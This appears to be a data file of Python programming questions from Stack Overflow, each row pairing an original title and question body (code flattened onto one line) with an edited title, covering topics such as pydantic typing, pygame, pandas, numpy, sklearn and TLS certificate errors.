how to check file exist in system or not using jinja in html page," I want to check that my dummy.csv exist or not in my local system. If it exist then this Check Fraud Status will be displayed otherwise it won't. I don't want to use Javascript. If any solution relating to python jinja then please help me out.And one more thing how to import os in html page using jinja?I had tried this:layout.html error <code>  {% if os.path.exists('./static/userdata/dummy.csv') %} <a class=""nav-item nav-link"" href=""{{ url_for('checkfraudstatus') }}"">Check Fraud Status</a>{% endif %} jinja2.exceptions.UndefinedError: 'os' is undefined",How to check file exist in system or not using jinja in html page?
Ho can mypy accept pydantic's choice() types?," I have this code: deptnr.py:6: error: Variable ""deptnr.DeptNumber"" is not valid as a typedeptnr.py:6: note: See https://mypy.readthedocs.io/en/latest/common_issues.html#variables-vs-type-aliasesThe provided link doesn't seem to really address my problem (I'm not using Type).This happens with or without this mypy.ini: Initially I also had that error in a Pydantic choice as below, but I got around that by using Python's Literal instead. What do I need to change to make mypy happy with my Pydantic constr? <code>  from pydantic import BaseModel, constrDeptNumber = constr(min_length=6, max_length=6)class MyStuff(BaseModel): dept: DeptNumberms = MyStuff(dept = ""123456"") [mypy]plugins = pydantic.mypy[pydantic-mypy]init_typed = true DIR = choice([""North"", ""East"", ""South"", ""West""])",How can mypy accept pydantic's constr() types?
How can mypy accept pydantic's choice() or constr() types?," I have this code: deptnr.py:6: error: Variable ""deptnr.DeptNumber"" is not valid as a typedeptnr.py:6: note: See https://mypy.readthedocs.io/en/latest/common_issues.html#variables-vs-type-aliasesThe provided link doesn't seem to really address my problem (I'm not using Type).This happens with or without this mypy.ini: Initially I also had that error in a Pydantic choice as below, but I got around that by using Python's Literal instead. What do I need to change to make mypy happy with my Pydantic constr? <code>  from pydantic import BaseModel, constrDeptNumber = constr(min_length=6, max_length=6)class MyStuff(BaseModel): dept: DeptNumberms = MyStuff(dept = ""123456"") [mypy]plugins = pydantic.mypy[pydantic-mypy]init_typed = true DIR = choice([""North"", ""East"", ""South"", ""West""])",How can mypy accept pydantic's constr() types?
how to continuesly move character when mousebutton is clicked [pygame]," I want to create a simple program that when you click on the screen, the box moves forever. It seems very simple, and it probably is, but I can't seem to make it work.code: There are no errors but I want it to move continuously and smoothly without stopping. How can I do this? I have tried to put a for I in range(100) but that only doubles the movement and it doesn't move smoothly. I have also tried to lower the speed and put a pygame. time.sleep(100) but that completely freezes everything <code>  import pygameimport sysfrom pygame.locals import *count = 0def blast1(): global bl, blast blast.y = bl # ran = random.randint(0, 450)pygame.init()running = Trueclock = pygame.time.Clock()bl = 10blast = pygame.Rect(300, 200 ,20,20)screen = pygame.display.set_mode((500, 500))while running: for event in pygame.event.get(): if event.type == pygame.QUIT: running = False blast1() screen.fill((255, 255, 255)) #color pygame.draw.ellipse(screen, [0, 255, 0], blast) keys=pygame.key.get_pressed() if event.type == pygame.MOUSEBUTTONDOWN and count != 1: blast.x += bl count = 1 pygame.display.flip() clock.tick(30)pygame.quit()",how to continuesly move character when mousebutton is clicked
Fastest way to sample most numbers from a list with minimum difference larger than a value in Python," Given a list of 20 float numbers, I want to find a largest subset where any two of the candidates are different from each other larger than a mindiff = 1.. Right now I am using a brute-force method to search from largest to smallest subsets using itertools.combinations. As shown below, the code finds a subset after 4 s for a list of 20 numbers. Output: However, in reality I have a list of 200 numbers, which is infeasible for a brute-froce enumeration. I want a fast algorithm to sample just one random largest subset with a minimum difference larger than 1. Note that I want each sample has randomness and maximum size. Any suggestions? <code>  from itertools import combinationsimport randomfrom time import timemindiff = 1.length = 20random.seed(99)lst = [random.uniform(1., 10.) for _ in range(length)]t0 = time()n = len(lst)sample = []found = Falsewhile not found: # get all subsets with size n subsets = list(combinations(lst, n)) # shuffle to ensure randomness random.shuffle(subsets) for subset in subsets: # sort the subset numbers ss = sorted(subset) # calculate the differences between every two adjacent numbers diffs = [j-i for i, j in zip(ss[:-1], ss[1:])] if min(diffs) > mindiff: sample = set(subset) found = True break # check subsets with size -1 n -= 1print(sample)print(time()-t0) {2.3704888087015568, 4.365818049020534, 5.403474619948962, 6.518944556233767, 7.8388969285727015, 9.117993839791751}4.182451486587524",Fastest way to sample most numbers with minimum difference larger than a value from a Python list
Python dictionary with nested and attribute lookups," I am looking for a namespace-like object that behaves like a Python evaluation context when getting and setting items, roughly equivalent to the following unsafe example: You can see the intended behaviour with lookups that access nested data or attributes: Setting nonexisting items fails in the natural way: Tuple splicing works: How can the example class be made safe (removing eval and exec) while still allowing at least nested lookups and attribute access? <code>  from collections import UserDictclass UnsafeNamespaceDict(UserDict): def __getitem__(self, var): return eval(var, {}, self.data) def __setitem__(self, var, val): return exec(f'{var} = val', {'val': val}, self.data) >>> nd = UnsafeNamespaceDict()>>> nd['x'] = 'abc'>>> nd['x[1]']'b'>>> nd['x.count']<built-in method count of str object>>>> nd['x[1].count']<built-in method count of str object> >>> nd['y.z'] = 1Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 5, in __setitem__ File ""<string>"", line 1, in <module>NameError: name 'y' is not defined >>> nd['a, b, c'] = 'ABC'>>> nd['c']'C'",Dictionary with nested and attribute lookups?
Why searching for larger strings in reversed take more time than slice reversing in python?," As I read here, reversing a string using the reversed function is more efficient than slice notation,string[::-1]. But when I tried it myself, I observed different results.First, I tried to make a very big string. And then I tried to check how much time it takes to check whether a string exists in the large one or not. This is what I did: If I check the existence of only 1 char in large, reversed is much faster, but when I attempt it for bigger strings, the result changes: What's happening under the hood? <code>  In [1]: large = ""abcdefgijklmnopqrstuvwxyz1234567890!@#$%^&*()_=+0}{QWERT"" In [2]: large = 1000*large In [3]: large = 1000*large In [5]: len(large) Out[5]: 56000000In [6]: %time ""a"" in large[::-1] CPU times: user 63 ms, sys: 43.4 ms, total: 106 msWall time: 106 msOut[6]: TrueIn [7]: %time ""a"" in reversed(large) CPU times: user 11 s, sys: 1 s, total: 12 sWall time: 17.6 sOut[7]: True In [8]: %time ""ab"" in large[::-1] CPU times: user 99.2 ms, sys: 44.1 ms, total: 143 msWall time: 143 msOut[8]: FalseIn [9]: %time ""ab"" in reversed(large) CPU times: user 1.73 s, sys: 4.48 ms, total: 1.73 sWall time: 1.74 sOut[9]: FalseIn [10]: %time ""abc"" in large[::-1] CPU times: user 125 ms, sys: 20 ms, total: 145 msWall time: 145 msOut[10]: FalseIn [11]: %time ""abc"" in reversed(large) CPU times: user 1.72 s, sys: 6.52 ms, total: 1.73 sWall time: 1.74 sOut[11]: False",Why does searching for larger strings in a `reversed` string take more time than slice reversing?
Why searching for larger strings in reversed take more time than slice reversing?," As I read here, reversing a string using the reversed function is more efficient than slice notation,string[::-1]. But when I tried it myself, I observed different results.First, I tried to make a very big string. And then I tried to check how much time it takes to check whether a string exists in the large one or not. This is what I did: If I check the existence of only 1 char in large, reversed is much faster, but when I attempt it for bigger strings, the result changes: What's happening under the hood? <code>  In [1]: large = ""abcdefgijklmnopqrstuvwxyz1234567890!@#$%^&*()_=+0}{QWERT"" In [2]: large = 1000*large In [3]: large = 1000*large In [5]: len(large) Out[5]: 56000000In [6]: %time ""a"" in large[::-1] CPU times: user 63 ms, sys: 43.4 ms, total: 106 msWall time: 106 msOut[6]: TrueIn [7]: %time ""a"" in reversed(large) CPU times: user 11 s, sys: 1 s, total: 12 sWall time: 17.6 sOut[7]: True In [8]: %time ""ab"" in large[::-1] CPU times: user 99.2 ms, sys: 44.1 ms, total: 143 msWall time: 143 msOut[8]: FalseIn [9]: %time ""ab"" in reversed(large) CPU times: user 1.73 s, sys: 4.48 ms, total: 1.73 sWall time: 1.74 sOut[9]: FalseIn [10]: %time ""abc"" in large[::-1] CPU times: user 125 ms, sys: 20 ms, total: 145 msWall time: 145 msOut[10]: FalseIn [11]: %time ""abc"" in reversed(large) CPU times: user 1.72 s, sys: 6.52 ms, total: 1.73 sWall time: 1.74 sOut[11]: False",Why does searching for larger strings in a `reversed` string take more time than slice reversing?
Why does python's `Exception`'s `repr` keep track of passed object's to `__init__`?," Please see the below code snippet: if A subclasses from Exception, its repr returns a reference to B() even though we only pass B()'s message attribute.Why is this the intentional behavior in Exception.repr and how does it work in python psuedocode if possible given the cpython code isn't too readable ? <code>  In [1]: class A(Exception): ...: def __init__(self, b): ...: self.message = b.message ...: In [2]: class B: ...: message = ""hello"" ...: In [3]: A(B())Out[3]: __main__.A(<__main__.B at 0x14af96790>)In [4]: class A: ...: def __init__(self, b): ...: self.message = b.message ...: In [5]: A(B())Out[5]: <__main__.A at 0x10445b0a0>",Why does python's Exception's repr keep track of passed object's to __init__?
Invoking constructor in 'with' statement," I have the following code: Running it produces the following output: But I expected it to produce: Why isn't the code within my first example called? <code>  class Test: def __init__(self, name): self.name = name def __enter__(self): print(f'entering {self.name}') def __exit__(self, exctype, excinst, exctb) -> bool: print(f'exiting {self.name}') return Truewith Test('first') as test: print(f'in {test.name}')test = Test('second')with test: print(f'in {test.name}') entering firstexiting firstentering secondin secondexiting second entering firstin firstexiting firstentering secondin secondexiting second",Invoking a constructor in a 'with' statement
str.isdigit() behaviour when handling utf-8 encoded strings," Assuming the following: Curiously: OK, let's convert those ""digits"" to integer: Oooops!Could someone please explain what behavior I should expect from the str.isdigit() method when handling strings? <code>  >>> square = '' # Superscript Two (Unicode U+00B2)>>> cube = '' # Superscript Three (Unicode U+00B3) >>> square.isdigit()True>>> cube.isdigit()True >>> int(square)Traceback (most recent call last): File ""<stdin>"", line 1, in <module>ValueError: invalid literal for int() with base 10: ''>>> int(cube)Traceback (most recent call last): File ""<stdin>"", line 1, in <module>ValueError: invalid literal for int() with base 10: ''",str.isdigit() behaviour when handling strings
Finding elements in generators in Python," One of my friends asked me about this piece of code: The output: Where did the other elements go? <code>  array = [1, 8, 15]gen = (x for x in array if array.count(x) > 0)array = [2, 8, 22]print(list(gen)) [8]",Why does redefining a variable used in a generator give strange results?
"sklearn.manifold.TSNE UFuncTypeError: ufunc 'multiply' did not contain a loop with signature matching types (dtype('<U32'), dtype('<U32'))...)"," I have run the sklearn.manifold.TSNE example code from the sklearn documentation, but I got the error described in the questions' title.I have already tried updating my sklearn version to the latest one (by !pip install -U scikit-learn) (scikit-learn=1.0.1). However, the problem is still there.Does anyone know how to fix it?python = 3.7.12sklearn= 1.0.1Example code: The error line happened in: Error message: <code>  import numpy as npfrom sklearn.manifold import TSNEX = np.array([[0, 0, 0], [0, 1, 1], [1, 0, 1], [1, 1, 1]])X_embedded = TSNE(n_components=2, learning_rate='auto', init='random').fit_transform(X)X_embedded.shape X_embedded = TSNE(n_components=2, learning_rate='auto', init='random').fit_transform(X) UFuncTypeError: ufunc 'multiply' did not contain a loop with signature matching types (dtype('<U32'), dtype('<U32')) -> dtype('<U32')","sklearn.manifold.TSNE TypeError: ufunc 'multiply' did not contain a loop with signature matching types (dtype('<U32'), dtype('<U32'))...)"
kernel carshes with matplotlib subplot," I have create this simple env with conda: The following code in jupyter lab crashes the kernel : I don't face the problem on Linux. The problem is when I try on Windows 10.There are no errors on the jupyter lab console (where I started the server), and I have no idea where to investigate. <code>  conda create -n test python=3.8.5 pandas scipy numpy matplotlib seaborn jupyterlab import matplotlib.pyplot as pltplt.subplot()","After conda update, python kernel crashes when matplotlib is used"
kernel carshes with matplotlib," I have create this simple env with conda: The following code in jupyter lab crashes the kernel : I don't face the problem on Linux. The problem is when I try on Windows 10.There are no errors on the jupyter lab console (where I started the server), and I have no idea where to investigate. <code>  conda create -n test python=3.8.5 pandas scipy numpy matplotlib seaborn jupyterlab import matplotlib.pyplot as pltplt.subplot()","After conda update, python kernel crashes when matplotlib is used"
python kernel crashes when plotting with matplotlib after conda update," I have create this simple env with conda: The following code in jupyter lab crashes the kernel : I don't face the problem on Linux. The problem is when I try on Windows 10.There are no errors on the jupyter lab console (where I started the server), and I have no idea where to investigate. <code>  conda create -n test python=3.8.5 pandas scipy numpy matplotlib seaborn jupyterlab import matplotlib.pyplot as pltplt.subplot()","After conda update, python kernel crashes when matplotlib is used"
"After conda update, python kernel crashes when matplotlib is used to plot"," I have create this simple env with conda: The following code in jupyter lab crashes the kernel : I don't face the problem on Linux. The problem is when I try on Windows 10.There are no errors on the jupyter lab console (where I started the server), and I have no idea where to investigate. <code>  conda create -n test python=3.8.5 pandas scipy numpy matplotlib seaborn jupyterlab import matplotlib.pyplot as pltplt.subplot()","After conda update, python kernel crashes when matplotlib is used"
PEM TLS Verification against REST api," I have been provided with a pem certificate to authenticate with a third party. Authenticating using certificates is a new concept for me.Inside are two certificates and a private key.The issuer has advised they do not support SSL verification but use TLS(1.1/1.2).I have run a script as below: I'm getting the following error:SSLError: HTTPSConnectionPool(host='url.com, port=443): Max retries exceeded with url: /call?%7B%22network%22:%20%7B%22network_id%22:%2012345%7D,%20%22branch%22:%20%7B%22branch_id%22:%2012345%7D,%20%22export_period%22:%20%7B%22start_date_time%22:%20%2216-11-2021%2000:00:00%22,%20%22end_date_time%22:%20%2217-11-2021%2000:00:00%22%7D%7D (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)')))Would appreciate guidance, my gut says I should be doing something specific for TLS hence the SSL error. <code>  import requests as reqimport jsonurl = 'https://url.com/call'certificate_file = ""C:/certs/cert.pem""headers = {""Content-Type"": ""application/json""} req_body ={ ""network"":{ ""network_id"": 12345 }, ""branch"":{ ""branch_id"": 12345, }, ""export_period"":{ ""start_date_time"": ""16-11-2021 00:00:00"", ""end_date_time"": ""17-11-2021 00:00:00"" }} jsonObject = json.dumps(req_body)response = req.post(url,headers=headers,params=jsonObject,verify=certificate_file)",PEM Certificate & TLS Verification against REST api
Scikit-learn - Determine wether the Columns of X are invariant under any given Transformer," Given an sklearn tranformer t, is there a way to determine whether t changes columns/column order of any given input dataset X, without applying it to the data?For example with t = sklearn.preprocessing.StandardScaler there is a 1-to-1 mapping between the columns of X and t.transform(X), namely X[:, i] -> t.transform(X)[:, i], whereas this is obviously not the case for sklearn.decomposition.PCA.A corollary of that would be: Can we know, how the columns of the input will change by applying t, e.g. which columns an already fitted sklearn.feature_selection.SelectKBest chooses.I am not looking for solutions to specific transformers, but a solution applicable to all or at least a wide selection of transformers.Feel free to implement your own Pipeline class or wrapper if necessary. <code> ",Determine whether the Columns of a Dataset are invariant under any given Scikit-Learn Transformer
Scikit-learn - Determine wether the Columns of a Dataset are invariant under any given Transformer," Given an sklearn tranformer t, is there a way to determine whether t changes columns/column order of any given input dataset X, without applying it to the data?For example with t = sklearn.preprocessing.StandardScaler there is a 1-to-1 mapping between the columns of X and t.transform(X), namely X[:, i] -> t.transform(X)[:, i], whereas this is obviously not the case for sklearn.decomposition.PCA.A corollary of that would be: Can we know, how the columns of the input will change by applying t, e.g. which columns an already fitted sklearn.feature_selection.SelectKBest chooses.I am not looking for solutions to specific transformers, but a solution applicable to all or at least a wide selection of transformers.Feel free to implement your own Pipeline class or wrapper if necessary. <code> ",Determine whether the Columns of a Dataset are invariant under any given Scikit-Learn Transformer
Determine whether the Columns of a Dataset are invariant under any given Transformer," Given an sklearn tranformer t, is there a way to determine whether t changes columns/column order of any given input dataset X, without applying it to the data?For example with t = sklearn.preprocessing.StandardScaler there is a 1-to-1 mapping between the columns of X and t.transform(X), namely X[:, i] -> t.transform(X)[:, i], whereas this is obviously not the case for sklearn.decomposition.PCA.A corollary of that would be: Can we know, how the columns of the input will change by applying t, e.g. which columns an already fitted sklearn.feature_selection.SelectKBest chooses.I am not looking for solutions to specific transformers, but a solution applicable to all or at least a wide selection of transformers.Feel free to implement your own Pipeline class or wrapper if necessary. <code> ",Determine whether the Columns of a Dataset are invariant under any given Scikit-Learn Transformer
pandas find start and stop point of not null values, I'd like to find the start and stop points of a column and flag them as shown below:valueflagNaNNaNNaNNaN1start2NaN1NaN3NaN2stopNaNNaN1start2stop <code> ,pandas find start and stop point of non-null values
Detecting angle difference between two circular objects," I'm trying to detect angle difference between two circular objects, which be shown as 2 image below.I'm thinking about rotate one of image with some small angle. Every time one image rotated, SSIM between rotated image and the another image will be calculated. The angle with maximum SSIM will be the angle difference.But, finding the extremes is never an easy problem. So my question is: Are there another algorithms (opencv) can be used is this case?IMAGE #1IMAGE #2EDIT:Thanks @Micka, I just do the same way he suggest and remove black region like @Yves Daoust said to improve processing time. Here is my final result:ORIGINAL IMAGEROTATED + SHIFTED IMAGE <code> ",Circular objects rotate angle detection
Python: Dividing a number into N parts each part being a multiple of 2," Let's assume I have the number 100 which I need to divide into N parts each of which shouldn't exceed 30 initially. So the initial grouping would be (30,30,30). The remainder (which is 10) is to be distributed among these three groups by adding 2 to each group in succession, thus ensuring that each group is a multiple of 2. The desired output should therefore look like (34,34,32).Note: The original number is always even.I tried solving this in Python and this is what I came up with. Clearly it's not working in the way I thought it would. It distributes the remainder by adding 1 (and not 2, as desired) iteratively to each group. Output: Desired output: <code>  num = 100parts = num//30 #Number of parts into which 'num' is to be divideddef split(a, b): result = ([a//b + 1] * (a%b) + [a//b] * (b - a%b)) return(result)print(split(num, parts)) [34, 33, 33] [34, 34, 32]",Dividing an even number into N parts each part being a multiple of 2
Python: Dividing an even number into N parts each part being a multiple of 2," Let's assume I have the number 100 which I need to divide into N parts each of which shouldn't exceed 30 initially. So the initial grouping would be (30,30,30). The remainder (which is 10) is to be distributed among these three groups by adding 2 to each group in succession, thus ensuring that each group is a multiple of 2. The desired output should therefore look like (34,34,32).Note: The original number is always even.I tried solving this in Python and this is what I came up with. Clearly it's not working in the way I thought it would. It distributes the remainder by adding 1 (and not 2, as desired) iteratively to each group. Output: Desired output: <code>  num = 100parts = num//30 #Number of parts into which 'num' is to be divideddef split(a, b): result = ([a//b + 1] * (a%b) + [a//b] * (b - a%b)) return(result)print(split(num, parts)) [34, 33, 33] [34, 34, 32]",Dividing an even number into N parts each part being a multiple of 2
python pandas dataframe - assign a list to multiple cells," I have a DataFrame like and a list I want to replace the col2 of every row with col1 = 'aa' with the list like I tried something like but it gives me the error: How should I get around this? <code>  name col1 col2 a aa 123 a bb 123 b aa 234 [1, 2, 3] name col1 col2 a aa [1, 2, 3] a bb 123 b aa [1, 2, 3] df.loc[df[col1] == 'aa', col2] = [1, 2, 3] ValueError: could not broadcast input array from shape (xx,) into shape (yy,)",python pandas DataFrame - assign a list to multiple cells
"Is there a way to scale up an np array, if so how"," Say I have this array: Returns: How should I go about getting it to return something like this? <code>  array = np.array([[1,2,3],[4,5,6],[7,8,9]]) 123456789 111222333111222333111222333444555666444555666444555666777888999777888999777888999",Repeat values of an array on both the axes
Repeat values of an array on the both axes," Say I have this array: Returns: How should I go about getting it to return something like this? <code>  array = np.array([[1,2,3],[4,5,6],[7,8,9]]) 123456789 111222333111222333111222333444555666444555666444555666777888999777888999777888999",Repeat values of an array on both the axes
